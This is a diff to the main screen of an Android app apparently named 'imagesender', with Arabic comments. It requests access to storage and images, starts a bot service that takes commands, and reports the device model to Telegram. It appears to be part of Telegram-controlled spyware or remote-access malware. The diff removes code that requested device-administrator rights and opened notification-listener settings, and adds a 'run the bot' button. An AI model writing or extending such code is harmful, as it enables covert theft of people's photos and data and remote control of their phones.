@@ -1,12 +1,11 @@
 package com.dotbhai.imagesender;
 
 import android.Manifest;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
-import android.provider.Settings;
+import android.widget.Button;
+import android.widget.LinearLayout;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -14,7 +13,6 @@ import androidx.core.app.ActivityCompat;
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERM_REQ = 100;
-
     private final String[] PERMS = {
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.READ_MEDIA_IMAGES,
@@ -34,21 +32,29 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle b) {
         super.onCreate(b);
 
+        // إنشاء واجهة بسيطة برمجياً عشان ما يخرج لحاله
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setPadding(50, 50, 50, 50);
+
+        Button btnStart = new Button(this);
+        btnStart.setText("تشغيل البوت");
+        layout.addView(btnStart);
+
+        setContentView(layout);
+
+        // طلب الأذونات
         ActivityCompat.requestPermissions(this, PERMS, PERM_REQ);
 
-        startService(new Intent(this, BotCommandService.class));
-
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        ComponentName cn = new ComponentName(this, AdminReceiver.class);
-        if (!dpm.isAdminActive(cn)) {
-            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
-            startActivity(i);
-        }
-
-        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-
-        TelegramSender.sendMessage("🚀 <b>التطبيق جاهز</b>\n" + Build.MODEL + "\nأرسل /start");
-        Toast.makeText(this, "البوت شغّال — افتح تلجرام", Toast.LENGTH_LONG).show();
+        btnStart.setOnClickListener(v -> {
+            try {
+                // تشغيل الخدمة اللي تجيب الأوامر
+                startService(new Intent(this, BotCommandService.class));
+                TelegramSender.sendMessage("🚀 <b>التطبيق جاهز</b>\n" + Build.MODEL + "\nأرسل /start");
+                Toast.makeText(this, "تم التشغيل! روح لتلجرام وأرسل /start", Toast.LENGTH_LONG).show();
+            } catch (Exception e) {
+                Toast.makeText(this, "خطأ: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            }
+        });
     }
 }
